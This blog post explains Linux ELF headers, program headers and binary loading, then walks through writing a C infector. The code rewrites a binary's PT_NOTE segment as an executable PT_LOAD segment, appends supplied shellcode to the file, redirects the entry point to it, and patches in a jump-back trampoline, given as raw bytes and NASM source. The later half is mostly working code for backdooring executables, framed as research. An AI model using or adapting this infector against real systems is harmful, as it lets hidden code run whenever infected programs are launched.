---
title: Infecting Linux ELF Files
Excerpt: 
ShowToc: true
date: 2025-02-23
categories: [ELF, linux, research, development, C]
tags: [ELF, linux, research, development, C]
---
## Elfland

Lately I've been thinking about Linux internals and malware. In this blog post, we're going to hark about the ELFs. Just as Windows has its own [executable format](https://www.stephan.onl/2023/08/portable-executable-format-and.html), so too does Linux.

If we look at the source code[^1] to the Executable and Linkable Format specification in `elf.h`, we can see the definition of the ELF header and some of its core machinery to get an idea of how it works.

```C
typedef struct elf64_hdr {
  unsigned char e_ident[EI_NIDENT]; /* ELF "magic number" */
  Elf64_Half e_type;
  Elf64_Half e_machine;
  Elf64_Word e_version;
  Elf64_Addr e_entry;       /* Entry point virtual address */
  Elf64_Off e_phoff;        /* Program header table file offset */
  Elf64_Off e_shoff;        /* Section header table file offset */
  Elf64_Word e_flags;
  Elf64_Half e_ehsize;
  Elf64_Half e_phentsize;
  Elf64_Half e_phnum;
  Elf64_Half e_shentsize;
  Elf64_Half e_shnum;
  Elf64_Half e_shstrndx;
} Elf64_Ehdr;

/* These constants define the permissions on sections in the program
   header, p_flags. */
#define PF_R    0x4
#define PF_W    0x2
#define PF_X    0x1

typedef struct elf64_phdr {
  Elf64_Word p_type;
  Elf64_Word p_flags;
  Elf64_Off p_offset;       /* Segment file offset */
  Elf64_Addr p_vaddr;       /* Segment virtual address */
  Elf64_Addr p_paddr;       /* Segment physical address */
  Elf64_Xword p_filesz;     /* Segment size in file */
  Elf64_Xword p_memsz;      /* Segment size in memory */
  Elf64_Xword p_align;      /* Segment alignment, file & memory */
} Elf64_Phdr;

typedef struct elf64_shdr {
  Elf64_Word sh_name;   /* Section name, index in string table */
  Elf64_Word sh_type;   /* Type of section */
  Elf64_Xword sh_flags;   /* Miscellaneous section attributes */
  Elf64_Addr sh_addr;   /* Section virtual addr at execution */
  Elf64_Off sh_offset;    /* Section file offset */
  Elf64_Xword sh_size;    /* Size of section in bytes */
  Elf64_Word sh_link;   /* Index of another section */
  Elf64_Word sh_info;   /* Additional section information */
  Elf64_Xword sh_addralign; /* Section alignment */
  Elf64_Xword sh_entsize; /* Entry size if section holds table */
} Elf64_Shdr;

typedef struct elf64_note {
  Elf64_Word n_namesz;  /* Name size */
  Elf64_Word n_descsz;  /* Content size */
  Elf64_Word n_type;    /* Content type */
} Elf64_Nhdr;

typedef struct elf64_sym {
  Elf64_Word st_name;   /* Symbol name, index in string tbl */
  unsigned char st_info;  /* Type and binding attributes */
  unsigned char st_other; /* No defined meaning, 0 */
  Elf64_Half st_shndx;    /* Associated section index */
  Elf64_Addr st_value;    /* Value of the symbol */
  Elf64_Xword st_size;    /* Associated symbol size */
} Elf64_Sym;

```

*"OK, so what?"* We're interested in how the `elf64_hdr` works. And it turns out it essentially uses a lookup table. The offset to the program header table is located in `e_phoff`. The program header table itself is defined by various `elf64_phdr` segments. 

Additionally, `elf64_shdr` section headers hold data, variables, and linking information[^2]: 
- **.text** for code instructions, 
- **.rodata** for read-only data, 
- **.plt** for the procedure linkage table, 
- **.data** segment for initialized data,
- **.bss** section for uninitialized variables,
- **.got.plt** section for dynamic interactions between the global offset table and procedure linkage table, 
- **.dynsym** for dynamic symbols imported from shared libraries, 
- **.dynstr** for dynamic strings, 
- **.rel** for relocation symbols, 
- **.hash** for hash table lookups, 
- **.symtab** for all symbols, 
- **.strtab** for a string table, 
- **.shstrtab** for a table to resolve the names of each of the tables themselves, 
- **.ctors** and **.dtors** - constructors and destructors - function pointers for initialization and finalization sequences before any code in the main body of the program executes.

However, many of these section headers aren't actually necessary for execution and can be stripped out from the binary. They mostly hold information for linking and debugging purposes.

Our primary interest is in the `elf64_phdr` table segments. This table controls what should or shouldn't be loaded into memory at runtime.[^3] When an ELF file is executed, it gets mapped[^4] by `mmap` according to whatever is specified by the ELF file program headers. 

## Loading 

If we take a look with `strace` we can see a bit about how binaries are loaded and executed. 

```text
$ strace /usr/bin/ls 
execve("/usr/bin/ls", ["ls"], 0x7ffcba885000 /* 24 vars */) = 0
brk(NULL)                               = 0x5dca6c78b000
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec0f8000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=64795, ...}) = 0
mmap(NULL, 64795, PROT_READ, MAP_PRIVATE, 3, 0) = 0x749cec0e8000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libselinux.so.1", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=174472, ...}) = 0
mmap(NULL, 181960, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec0bb000
mmap(0x749cec0c1000, 118784, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) = 0x749cec0c1000
mmap(0x749cec0de000, 24576, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x23000) = 0x749cec0de000
mmap(0x749cec0e4000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x29000) = 0x749cec0e4000
mmap(0x749cec0e6000, 5832, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec0e6000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
fstat(3, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cebe00000
mmap(0x749cebe28000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x28000) = 0x749cebe28000
mmap(0x749cebfb0000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0x749cebfb0000
mmap(0x749cebfff000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1fe000) = 0x749cebfff000
mmap(0x749cec005000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x749cec005000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libpcre2-8.so.0", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0644, st_size=625344, ...}) = 0
mmap(NULL, 627472, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x749cec021000
mmap(0x749cec023000, 450560, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) = 0x749cec023000
mmap(0x749cec091000, 163840, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x70000) = 0x749cec091000
mmap(0x749cec0b9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x97000) = 0x749cec0b9000
close(3)                                = 0
mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x749cec01e000
arch_prctl(ARCH_SET_FS, 0x749cec01e800) = 0
set_tid_address(0x749cec01ead0)         = 86655
set_robust_list(0x749cec01eae0, 24)     = 0
rseq(0x749cec01f120, 0x20, 0, 0x53053053) = 0
mprotect(0x749cebfff000, 16384, PROT_READ) = 0
mprotect(0x749cec0b9000, 4096, PROT_READ) = 0
mprotect(0x749cec0e4000, 4096, PROT_READ) = 0
mprotect(0x5dca4b2a4000, 8192, PROT_READ) = 0
mprotect(0x749cec130000, 8192, PROT_READ) = 0
prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
...
// snipped
```

The kernel first calls `execve`, effectively forking the program by saying "replacing my current program with this one."[^5] 

Then a call is made to `brk` to locate the end of the data segment[^6][^7]. The ELF header then gets parsed[^8] to determine how to process the program headers and it is mapped into memory.


```C

// snippet from fs/binfmt_elf.c

/**
 * load_elf_phdrs() - load ELF program headers
 * @elf_ex:   ELF header of the binary whose program headers should be loaded
 * @elf_file: the opened ELF binary file
 *
 * Loads ELF program headers from the binary file elf_file, which has the ELF
 * header pointed to by elf_ex, into a newly allocated array. The caller is
 * responsible for freeing the allocated data. Returns NULL upon failure.
 */
static struct elf_phdr *load_elf_phdrs(const struct elfhdr *elf_ex,
               struct file *elf_file)
{
  struct elf_phdr *elf_phdata = NULL;
  int retval = -1;
  unsigned int size;

  /*
   * If the size of this structure has changed, then punt, since
   * we will be doing the wrong thing.
   */
  if (elf_ex->e_phentsize != sizeof(struct elf_phdr))
    goto out;

  /* Sanity check the number of program headers... */
  /* ...and their total size. */
  size = sizeof(struct elf_phdr) * elf_ex->e_phnum;
  if (size == 0 || size > 65536 || size > ELF_MIN_ALIGN)
    goto out;

  elf_phdata = kmalloc(size, GFP_KERNEL);
  if (!elf_phdata)
    goto out;

  /* Read in the program headers */
  retval = elf_read(elf_file, elf_phdata, size, elf_ex->e_phoff);

out:
  if (retval) {
    kfree(elf_phdata);
    elf_phdata = NULL;
  }
  return elf_phdata;
}
```

The ELF interpeter handles how the file is loaded. It resolves the symbols, segments, and necessary information to run the binary.

In this case, the dynamic linker `ld.so` is called since our binary is dynamically linked. This resolves the dependencies necessary for execution.

And `mmap` gets called to allocate memory for all the necessary virtual memory mappings: the stack, heap, and anonymous mappings. 

For each shared library the kernel needs, the loader uses `mmap()` to map the segments and each library into memory at the addresses specified by the ELF headers. Appropriate permissions are set. Relocations are processed by the linker[^9] and calls to `mprotect` set some memory locations into read-only mode. When the program is done executing, it calls `unmap()`.

And actually, a lot more than this happens. If we step through the program with `gdb` we see that `strace` is only giving us a high level overview. 

We only see the syscalls. But execution of the run time dynamic linker actually begins at `_dl_start` within `elf/rtld.c`, and it's much more sophisticated.[^10]

```text
$ cat breakpoints.log | grep Breakpoint | cut -f3 -d' ' | awk '!seen[$0]++'
0x00007ffff7fe4540
_dl_start
elf_get_dynamic_info
_dl_start_final
_dl_setup_hash
_dl_sysdep_start
process_envvars
_dl_new_object
_dl_map_object_deps
0x00007ffff7fc7abe
_dl_map_object
_dl_map_object_from_fd
_dl_relocate_object
elf_machine_lazy_rel
__GI_mprotect
elf_machine_runtime_setup
__GI_munmap
```


We'll save this matter for a different post. But for now, just know that our `strace` output is in no way an exhaustive or full explanation of all the things that occur to enable loading our ELF binary. Though it does give us a view of the system calls that occur, which is helpful for tracing and debugging, it still conceals a lot of implementation details.

## Segment Types

For each ELF program header segment, the `p_type` field tells the kernel how to interpret the header. For reference: the `elf64_phdr` structure and possible `p_type` values. 


```C
typedef struct elf64_phdr {
  Elf64_Word p_type;
  Elf64_Word p_flags;
  Elf64_Off p_offset;       /* Segment file offset */
  Elf64_Addr p_vaddr;       /* Segment virtual address */
  Elf64_Addr p_paddr;       /* Segment physical address */
  Elf64_Xword p_filesz;     /* Segment size in file */
  Elf64_Xword p_memsz;      /* Segment size in memory */
  Elf64_Xword p_align;      /* Segment alignment, file & memory */
} Elf64_Phdr;
```


| Type        | Value        | Description                                  |
|-------------|--------------|----------------------------------------------|
| PT_NULL     | 0            | Unused element                              |
| PT_LOAD     | 1            | Loadable segment described by p_filesz and p_memsz |
| PT_DYNAMIC  | 2            | Dynamic linking info                        |
| PT_INTERP   | 3            | Interpreter to invoke; usually ld           |
| PT_NOTE     | 4            | Location and size of auxiliary info         |
| PT_SHLIB    | 5            | Reserved                                    |
| PT_PHDR     | 6            | Specifies location and size of program header table itself |
| PT_TLS      | 7            | Specifies a thread local storage template   |
| PT_LOPROC   | 0x70000000   | Reserved                                    |
| PT_HIPROC   | 0x7fffffff   | Reserved                                    |


For example, the `PT_DYNAMIC` segment specifies dynamic linking information. And the `PT_INTERP` segment specifies the interpreter to invoke. This is usually the dynamic linker `ld`. 

```text
$ readelf -p .interp /usr/bin/ls

String dump of section '.interp':
  [     0]  /lib64/ld-linux-x86-64.so.2
```

But segments marked `PT_LOAD` denote loadable segments. `PT_LOAD` segments are described by the `p_filesz` and `p_memsz` fields.[^11] The bytes from `PT_LOAD` segments are mapped to the beginning of the memory segment. And later we will see that we actually have more granular control over where, exactly, things get mapped to via the `p_vaddr` field.

If we use `readelf` with the `-l` flag, we can see an ELF's program headers and each of their respective permission `Flags`: `read`, `write`, or `executable`.


```text
$ readelf -l /usr/bin/ls
Elf file type is DYN (Position-Independent Executable file)
Entry point 0x6d30
There are 13 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000002d8 0x00000000000002d8  R      0x8
  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x00000000000036f8 0x00000000000036f8  R      0x1000
  LOAD           0x0000000000004000 0x0000000000004000 0x0000000000004000
                 0x0000000000014db1 0x0000000000014db1  R E    0x1000
  LOAD           0x0000000000019000 0x0000000000019000 0x0000000000019000
                 0x00000000000071b8 0x00000000000071b8  R      0x1000
  LOAD           0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
                 0x0000000000001348 0x00000000000025e8  RW     0x1000
  DYNAMIC        0x0000000000021a38 0x0000000000022a38 0x0000000000022a38
                 0x0000000000000200 0x0000000000000200  RW     0x8
  NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  NOTE           0x0000000000000368 0x0000000000000368 0x0000000000000368
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  GNU_EH_FRAME   0x000000000001e170 0x000000000001e170 0x000000000001e170
                 0x00000000000005ec 0x00000000000005ec  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000020f30 0x0000000000021f30 0x0000000000021f30
                 0x00000000000010d0 0x00000000000010d0  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 
   03     .init .plt .plt.got .plt.sec .text .fini 
   04     .rodata .eh_frame_hdr .eh_frame 
   05     .init_array .fini_array .data.rel.ro .dynamic .got .data .bss 
   06     .dynamic 
   07     .note.gnu.property 
   08     .note.gnu.build-id .note.ABI-tag 
   09     .note.gnu.property 
   10     .eh_frame_hdr 
   11     
   12     .init_array .fini_array .data.rel.ro .dynamic .got 
```

The program header we're interested in is the `NOTE` segment. As you can see above, this particular header is not intended to be executable. By default it's read-only. The `PT_NOTE` header specifies an auxiliary field for storing information. We can see its construction here. 

For example, a software vendor might desire to mark an executable with information to indicate remarks about compatibility. Together, the `PT_NOTE` section consists of an array of 4-byte words.

```C
/* Note header in a PT_NOTE section */
typedef struct elf64_note {
  Elf64_Word n_namesz;  /* Name size */
  Elf64_Word n_descsz;  /* Content size */
  Elf64_Word n_type;    /* Content type */
} Elf64_Nhdr;
```

The sizes for all of the ELF's corresponding types and sizes can be found in `elf.h` in almost any Linux [repo](https://elixir.bootlin.com/glibc/glibc-2.41.9000/source/elf/elf.h).


```C
/* Standard ELF types.  */

#include <stdint.h>

/* Type for a 16-bit quantity.  */
typedef uint16_t Elf32_Half;
typedef uint16_t Elf64_Half;

/* Types for signed and unsigned 32-bit quantities.  */
typedef uint32_t Elf32_Word;
typedef int32_t  Elf32_Sword;
typedef uint32_t Elf64_Word;
typedef int32_t  Elf64_Sword;

/* Types for signed and unsigned 64-bit quantities.  */
typedef uint64_t Elf32_Xword;
typedef int64_t  Elf32_Sxword;
typedef uint64_t Elf64_Xword;
typedef int64_t  Elf64_Sxword;

/* Type of addresses.  */
typedef uint32_t Elf32_Addr;
typedef uint64_t Elf64_Addr;

/* Type of file offsets.  */
typedef uint32_t Elf32_Off;
typedef uint64_t Elf64_Off;

/* Type for section indices, which are 16-bit quantities.  */
typedef uint16_t Elf32_Section;
typedef uint16_t Elf64_Section;

/* Type for version symbol information.  */
typedef Elf32_Half Elf32_Versym;
typedef Elf64_Half Elf64_Versym;
```

If we want to see the `PT_NOTE` or `SHT_NOTE` segments of ELF binaries for ourselves, we can glean them using the `readelf` utility with the `-n` or `--notes` flag. 

```text
$ readelf -n /usr/bin/ls

Displaying notes found in: .note.gnu.property
  Owner                Data size    Description
  GNU                  0x00000020   NT_GNU_PROPERTY_TYPE_0
      Properties: x86 feature: IBT, SHSTK
    x86 ISA needed: x86-64-baseline

Displaying notes found in: .note.gnu.build-id
  Owner                Data size    Description
  GNU                  0x00000014   NT_GNU_BUILD_ID (unique build ID bitstring)
    Build ID: 3eca7e3905b37d48cf0a88b576faa7b95cc3097b

Displaying notes found in: .note.ABI-tag
  Owner                Data size    Description
  GNU                  0x00000010   NT_GNU_ABI_TAG (ABI version tag)
    OS: Linux, ABI: 3.2.0
```

## Constructing an Infector

Now that we have an idea about how ELF files are structured and operate, we can further clarify our objectives. What do we want to do? First we want to read and write.

But before we can do so, we need to set some declarations based on the ELF structures to help us construct our gadgets:

```C
Elf64_Ehdr* read_elf64_header(int fd);
Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum);
int write_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum, Elf64_Phdr *phdrs);
int write_elf64_header(int fd, Elf64_Ehdr *header);
unsigned char* read_file(const char *filename, size_t *length);
void write_u64_le(unsigned char *dest, uint64_t val);
void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t start_offset);
```

We want to open and read both an ELF binary and a shellcode file to some allocated memory buffers. Our `main` function:

```C
int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ELF File> <Shellcode File>\n", argv[0]);
        exit(1);
    }

    const char *elf_path = argv[1];
    const char *bin_path = argv[2];

    // Open ELF file with RW permissions
    int elf_fd = open(elf_path, O_RDWR);
    if (elf_fd < 0) {
        fprintf(stderr, "Error opening ELF file '%s': %s\n", elf_path, strerror(errno));
        exit(1);
    }

    // Load shellcode from file
    size_t shellcode_len = 0;
    unsigned char *shellcode = read_file(bin_path, &shellcode_len);
    if (shellcode == NULL) {
        fprintf(stderr, "Error reading shellcode file '%s'\n", bin_path);
        close(elf_fd);
        exit(1);
    }

    // Parse ELF and program headers
    Elf64_Ehdr *elf_header = read_elf64_header(elf_fd);
    if (elf_header == NULL) {
        fprintf(stderr, "Error reading ELF header\n");
        close(elf_fd);
        free(shellcode);
        exit(1);
    }

    Elf64_Phdr *program_headers = read_elf64_program_headers(elf_fd, elf_header->e_phoff, elf_header->e_phnum);
    if (program_headers == NULL) {
        fprintf(stderr, "Error reading program headers\n");
        close(elf_fd);
        free(elf_header);
        free(shellcode);
        exit(1);
    }

// snipped
```

We first call out to our `read_file` function to get our shellcode. Once inside, we give `fopen` our filename and `SEEK` to the end of the file to get its size with `ftell`.

We call `malloc` against our file size to allocate a buffer, then call `fread` to read the file into the newly allocated buffer. If the function doesn't error out, we return a pointer to the buffer.

```C
// Read entire contents of a file into a dynamically allocated buffer
// File length is stored in *length
// Return pointer to buffer on success, or NULL on failure

unsigned char* read_file(const char *filename, size_t *length) {
    FILE *fp = fopen(filename, "rb");
    if (fp == NULL) {
        fprintf(stderr, "Error opening file '%s': %s\n", filename, strerror(errno));
        return NULL;
    }
    if (fseek(fp, 0, SEEK_END) != 0) {
        fprintf(stderr, "Error seeking in file '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    long file_size = ftell(fp);
    if (file_size < 0) {
        fprintf(stderr, "Error getting file size for '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    rewind(fp);
    unsigned char *buffer = malloc(file_size);
    if (buffer == NULL) {
        fprintf(stderr, "Error allocating memory for file '%s'\n", filename);
        fclose(fp);
        return NULL;
    }
    size_t read_size = fread(buffer, 1, file_size, fp);
    if (read_size != (size_t)file_size) {
        fprintf(stderr, "Error reading file '%s'\n", filename);
        free(buffer);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *length = read_size;
    return buffer;
}
```

After returning from our call to `read_file` to get the shellcode buffer, we're ready to call our ELF helper functions to parse both the ELF header and its program headers. 

We use `lseek` and `SEEK_SET` to get an offset to the beginning of the ELF header and allocate it to memory with `malloc`. Then we get the program headers. 

The resulting size of the array of program headers is the size of the `ELF64_Phdr` times the number of program headers `phnum`:

```C
// Read the ELF64 header from the given file descriptor
// Return a pointer to an allocated Elf64_Ehdr structure on success, or NULL on failure
Elf64_Ehdr* read_elf64_header(int fd) {
    if (lseek(fd, 0, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to beginning of ELF file\n");
        return NULL;
    }
    Elf64_Ehdr *header = malloc(sizeof(Elf64_Ehdr));
    if (header == NULL) {
        fprintf(stderr, "Error allocating memory for ELF header\n");
        return NULL;
    }
    if (read(fd, header, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr)) {
        fprintf(stderr, "Error reading ELF header\n");
        free(header);
        return NULL;
    }
    return header;
}


// Read ELF64 program headers from the given file descriptor at offset phoff
// expecting phnum headers 
// Return a pointer to an allocated array of program headers
// or NULL on failure

Elf64_Phdr* read_elf64_program_headers(int fd, uint64_t phoff, uint16_t phnum) {
    if (lseek(fd, phoff, SEEK_SET) < 0) {
        fprintf(stderr, "Error seeking to program headers offset\n");
        return NULL;
    }
    Elf64_Phdr *phdrs = malloc(sizeof(Elf64_Phdr) * phnum);
    if (phdrs == NULL) {
        fprintf(stderr, "Error allocating memory for program headers\n");
        return NULL;
    }
    size_t total_size = sizeof(Elf64_Phdr) * phnum;
    if (read(fd, phdrs, total_size) != (ssize_t)total_size) {
        fprintf(stderr, "Error reading program headers from ELF file\n");
        free(phdrs);
        return NULL;
    }
    return phdrs;
}

```

After we've read both our shellcode file and our ELF headers, allocating them to memory with `malloc` -- we land back in `main` function once more. 

Now we do a few important things. First we store the original `e_entry` from the ELF header in `original entry`. We need this later.

Then we get the file size of the target ELF binary with `stat` by accessing `st_size`. We save this physical file size offset in `file_offset`. 

Then we generate a `memory_offset` using a high address by adding `0xc00000000` to our `file_offset`. This `memory_offset` is the virtual addressing where we want to load our shellcode to when our ELF file gets mapped. The high addressing ensures our shellcode will be mapped far away from any of the other data. And it's where we're going to point `e_entry`.

Then we alter the `PT_NOTE` into a `PT_LOAD` segment. We give it `read` and `execute` permissions. We set the `p_offset` field to our `file_offset` and our virtual memory address to the `memory_offset`. 

Then we adjust the `p_memsz` and `p_filesz` fields, incrementing them by the length of our shellcode -- making room for it in the virtual file image mapping. And last, we patch the `entry` of the ELF header to point to our `memory_offset` where our malware will be mapped to.


```C
    // Save the old entry point so we can jump later
    uint64_t original_entry = elf_header->e_entry;

    
    uint64_t sc_len = (uint64_t)shellcode_len;

    // Calculate offsets for patching the ELF and program headers
    
    struct stat st;
    if (fstat(elf_fd, &st) != 0) {
        fprintf(stderr, "Error getting ELF file metadata: %s\n", strerror(errno));
        close(elf_fd);
        free(elf_header);
        free(program_headers);
        free(shellcode);
        exit(1);
    }
    uint64_t file_offset = st.st_size;
    uint64_t memory_offset = 0xc00000000ULL + file_offset;

    // Look for PT_NOTE section
    for (int i = 0; i < elf_header->e_phnum; i++) {
        if (program_headers[i].p_type == PT_NOTE) {
            // Convert to a PT_LOAD section with values to load shellcode
            printf("[+] Found PT_NOTE section\n");
            printf("[+] Changing to PT_LOAD\n");
            program_headers[i].p_type = PT_LOAD;
            program_headers[i].p_flags = PF_R | PF_X;
            program_headers[i].p_offset = file_offset;
            program_headers[i].p_vaddr = memory_offset;
            program_headers[i].p_memsz += sc_len;
            program_headers[i].p_filesz += sc_len;
            // Patch the ELF header to start at the shellcode
            elf_header->e_entry = memory_offset;
            printf("[+] Patched e_entry\n");
            break;
        }
    }

    // Patch shellcode to jump to the original entry point after finishing
    patch(&shellcode, &shellcode_len, elf_header->e_entry, original_entry);

   
```
A few remarks about what's going on here, exactly:
```plaintext
p_type = PT_LOAD;             // Set PT_LOAD flag


p_flags = PF_R | PF_X;        // Set read and execute permissions


p_offset = file_offset;       // Set p_offset to the file_offset. The file_offset
                              // is the size of the original ELF binary.
                              // And what's at the *end* of our ELF?
                              // The shellcode we append.

p_vaddr = memory_offset;      // The virtual address offset we want to map our 
                              // shellcode to. Equivalent to the file size
                              // offset but at a higher address range, e.g.
                              // 0xc00000000

p_memsz += sc_len;            // Increase the number of bytes in the file 
                              // image of the segment by the length of 
                              // the shellcode

p_filesz += sc_len;           // Increase the number of bytes in the memory 
                              // image of the segment by the length of the 
                              // shellcode

```
Lastly, use assign `elf_header->e_entry = memory_offset`, modifying the ELF entry to point to our memory offset where our shellcode will reside when it's loaded.

## And Patch Me Up

The next step is really important to understand. This is where we call our very helpful `patch` function. 

```C
    // Patch shellcode to jump to the original entry point after finishing
    patch(&shellcode, &shellcode_len, elf_header->e_entry, original_entry);
```

And once inside, there's an additional array of shellcode called `jump_shellcode`. We patch this array with the values we pass to the `patch` function. 

We then modify the original shellcode buffer from earlier -- extending it by the size of the additional `jump_shellcode` array. 

After our original shellcode array is extended by the size of the `jump_shellcode` array, we `memcpy` the additional patched `jump_shellcode` into the extended shellcode buffer space, aka at the end of our malware code. And finally we update our shellcode buffer and length pointers to our new updated shellcode buffer and length pointers.


```C
// Patch in shellcode from jumpstart.s to resolve original_entry point

void patch(unsigned char **shellcode, size_t *shellcode_len, uint64_t entry_point, uint64_t original_entry) {
   
    unsigned char jump_shellcode[] = {
        0xe8, 0x2d, 0x00, 0x00, 0x00, 0x49, 0xb9, 0xef, 0xbe, 0xad, 0xde, 0xef, 0xbe, 0xad, 0xde,
        0x49, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x0d, 0xf0, 0xad, 0xba, 0x49, 0xbb, 0xb5, 0x00, 0x6b,
        0xb1, 0xb5, 0x00, 0x6b, 0xb1, 0x4c, 0x29, 0xc8, 0x48, 0x83, 0xe8, 0x05, 0x4c, 0x29, 0xd0,
        0x4c, 0x01, 0xd8, 0xff, 0xe0, 0x48, 0x8b, 0x04, 0x24, 0xc3
    };
    // Write values using little-endian ordering
    write_u64_le(&jump_shellcode[7], (uint64_t)(*shellcode_len));
    write_u64_le(&jump_shellcode[17], entry_point);
    write_u64_le(&jump_shellcode[27], original_entry);

    // Extend shellcode vector by appending the jump_shellcode size;
    // Realloc new size, memcpy jump_shellcode into extended space
    size_t new_len = *shellcode_len + sizeof(jump_shellcode);
    unsigned char *new_shellcode = realloc(*shellcode, new_len);
    if (new_shellcode == NULL) {
        fprintf(stderr, "Error reallocating shellcode buffer\n");
        free(*shellcode);
        exit(1);
    }
    memcpy(new_shellcode + *shellcode_len, jump_shellcode, sizeof(jump_shellcode));
    *shellcode = new_shellcode;
    *shellcode_len = new_len;
}
```

Our shellcode length, aka VSIZE, is stored starting at byte 8. Our entry point, aka `ENTRY`, is stored at byte 17. Our original entry, aka `START` is stored at byte 27. 

See, the constants we define in the assembly -- which we use to generate the jump shellcode -- are merely placeholders. The values in the `jump_shellcode` array are being overwritten with *our* values -- our shellcode length, entry point, and original entry. 

After the patch function completes, we go back to the main function where we write all of this back to the target ELF -- appending our shellcode to the *end* of the binary by calling `SEEK_END` on our ELF file descriptor -- and using our write gadgets to write back the altered program headers to the ELF file.

Below is the assembly code of the `jump_shellcode` array. If it doesn't make sense yet, I'll try to explain below.

```nasm
BITS 64
%define VSIZE 0xDEADBEEFDEADBEEF   
%define ENTRY 0xBAADF00DBAADF00D
%define START 0xB16B00B5B16B00B5   

    ; - position independent executables move addresses, so
    ; 1) call to get_foo instruction pointer into rax then 
    ; 2) load our constants into registers r9, r10, r11
    ; 3) subtract our malware size, (& subtract 5!)
    ;   *(the size of the get_foo instruction)
    ; 4) subtract patched entry offset from rax  
    ; 5) add our original entry point to r11
    ; 6) finally jmp to rax
    call get_foo
    mov r9, VSIZE
    mov r10, ENTRY
    mov r11, START
    sub rax, r9
    sub rax, 5
    sub rax, r10
    add rax, r11
    jmp rax
get_foo:
    mov rax, [rsp]
    ret
```

